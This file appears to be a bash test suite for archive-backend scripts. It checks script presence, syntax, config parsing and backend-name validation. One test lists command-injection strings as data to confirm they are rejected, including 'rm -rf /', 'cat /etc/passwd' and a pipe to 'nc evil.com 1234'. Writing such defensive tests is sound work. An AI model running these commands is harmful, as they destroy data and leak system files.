#!/bin/bash -eu
#
# Test suite for multi-backend archive functionality
#

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
RUN_DIR="$SCRIPT_DIR/../run/multi_backend"

TESTS_PASSED=0
TESTS_FAILED=0

echo "================================"
echo "Multi-Backend Archive Tests"
echo "================================"
echo ""

# Test 1: Check all required scripts exist
echo "Test 1: Required scripts exist..."
required_scripts=(
  "archive-clips.sh"
  "verify-archive-configuration.sh"
  "configure-archive.sh"
  "connect-archive.sh"
  "disconnect-archive.sh"
  "archive-is-reachable.sh"
  "write-archive-configs-to.sh"
)

all_exist=true
for script in "${required_scripts[@]}"; do
  if [ ! -f "$RUN_DIR/$script" ]; then
    echo "  FAIL: Missing $script"
    all_exist=false
  fi
done

if [ "$all_exist" = true ]; then
  echo "  PASS: All required scripts present"
  TESTS_PASSED=$((TESTS_PASSED + 1))
else
  TESTS_FAILED=$((TESTS_FAILED + 1))
fi

# Test 2: Scripts are executable
echo "Test 2: Scripts are executable..."
all_executable=true
for script in "${required_scripts[@]}"; do
  if [ ! -x "$RUN_DIR/$script" ]; then
    echo "  FAIL: $script not executable"
    all_executable=false
  fi
done

if [ "$all_executable" = true ]; then
  echo "  PASS: All scripts executable"
  TESTS_PASSED=$((TESTS_PASSED + 1))
else
  TESTS_FAILED=$((TESTS_FAILED + 1))
fi

# Test 3: Script syntax validation
echo "Test 3: Bash syntax validation..."
syntax_ok=true
for script in "${required_scripts[@]}"; do
  if ! bash -n "$RUN_DIR/$script" 2>/dev/null; then
    echo "  FAIL: Syntax error in $script"
    syntax_ok=false
  fi
done

if [ "$syntax_ok" = true ]; then
  echo "  PASS: All scripts have valid syntax"
  TESTS_PASSED=$((TESTS_PASSED + 1))
else
  TESTS_FAILED=$((TESTS_FAILED + 1))
fi

# Test 4: Config file format validation
echo "Test 4: Configuration parsing..."

# Create temp config
temp_config=$(mktemp)
echo "PRIMARY_BACKEND=cifs" > "$temp_config"
echo "SECONDARY_BACKEND=rclone" >> "$temp_config"

PRIMARY=$(grep "^PRIMARY_BACKEND=" "$temp_config" | sed 's/^PRIMARY_BACKEND=//' | tr -d '"' | tr -d '[:space:]')
SECONDARY=$(grep "^SECONDARY_BACKEND=" "$temp_config" | sed 's/^SECONDARY_BACKEND=//' | tr -d '"' | tr -d '[:space:]')

if [ "$PRIMARY" = "cifs" ] && [ "$SECONDARY" = "rclone" ]; then
  echo "  PASS: Config parsing works correctly"
  TESTS_PASSED=$((TESTS_PASSED + 1))
else
  echo "  FAIL: Config parsing failed (PRIMARY=$PRIMARY, SECONDARY=$SECONDARY)"
  TESTS_FAILED=$((TESTS_FAILED + 1))
fi

rm -f "$temp_config"

# Test 5: Backend validation
echo "Test 5: Backend name validation..."

valid_backends=("cifs" "rsync" "rclone")
invalid_backends=("ftp" "s3" "nfs" "smb")

validation_passed=true

# Test valid backends
for backend in "${valid_backends[@]}"; do
  if [[ ! "$backend" =~ ^(cifs|rsync|rclone)$ ]]; then
    echo "  FAIL: Valid backend $backend rejected"
    validation_passed=false
  fi
done

# Test invalid backends
for backend in "${invalid_backends[@]}"; do
  if [[ "$backend" =~ ^(cifs|rsync|rclone)$ ]]; then
    echo "  FAIL: Invalid backend $backend accepted"
    validation_passed=false
  fi
done

if [ "$validation_passed" = true ]; then
  echo "  PASS: Backend validation works correctly"
  TESTS_PASSED=$((TESTS_PASSED + 1))
else
  TESTS_FAILED=$((TESTS_FAILED + 1))
fi

# Test 6: Injection prevention
echo "Test 6: Command injection prevention..."

malicious_inputs=(
  'cifs; rm -rf /'
  'rclone && cat /etc/passwd'
  'rsync | nc evil.com 1234'
  'cifs$(whoami)'
  'rclone`id`'
)

injection_blocked=true
for input in "${malicious_inputs[@]}"; do
  if [[ "$input" =~ ^(cifs|rsync|rclone)$ ]]; then
    echo "  FAIL: Malicious input accepted: $input"
    injection_blocked=false
  fi
done

if [ "$injection_blocked" = true ]; then
  echo "  PASS: Injection attempts blocked"
  TESTS_PASSED=$((TESTS_PASSED + 1))
else
  TESTS_FAILED=$((TESTS_FAILED + 1))
fi

# Test 7: Marker file handling
echo "Test 7: Marker file logic..."

temp_marker_dir=$(mktemp -d)
test_marker="$temp_marker_dir/primary_done_testfile.marker"

# Create marker
touch "$test_marker"
if [ -f "$test_marker" ]; then
  # Remove marker
  rm -f "$test_marker"
  if [ ! -f "$test_marker" ]; then
    echo "  PASS: Marker file handling works"
    TESTS_PASSED=$((TESTS_PASSED + 1))
  else
    echo "  FAIL: Marker file not removed"
    TESTS_FAILED=$((TESTS_FAILED + 1))
  fi
else
  echo "  FAIL: Marker file not created"
  TESTS_FAILED=$((TESTS_FAILED + 1))
fi

rm -rf "$temp_marker_dir"

# Summary
echo ""
echo "================================"
echo "Test Summary"
echo "================================"
echo "Passed: $TESTS_PASSED"
echo "Failed: $TESTS_FAILED"
echo ""

if [ "$TESTS_FAILED" -eq 0 ]; then
  echo "✓ All tests passed!"
  exit 0
else
  echo "✗ Some tests failed"
  exit 1
fi
